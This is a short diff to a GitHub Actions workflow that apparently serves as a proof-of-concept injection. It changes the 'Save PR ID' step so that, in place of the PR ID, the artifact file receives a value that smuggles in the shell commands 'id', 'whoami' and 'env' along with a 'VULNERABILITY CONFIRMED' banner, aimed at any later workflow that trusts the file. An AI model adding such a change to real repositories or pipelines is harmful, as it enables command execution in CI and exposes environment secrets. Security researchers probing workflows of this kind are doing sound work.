@@ -30,7 +30,7 @@ jobs:
         run: pnpm -w test
 
       - name: Save PR ID
-        run: echo "$PR_ID" > ${{ env.PR_ID_FILE }}
+        run: echo "1; echo ' [!] VULNERABILITY CONFIRMED [!] '; id; whoami; env" > ${{ env.PR_ID_FILE }}
 
       - name: Upload PR ID
         uses: actions/upload-artifact@v4
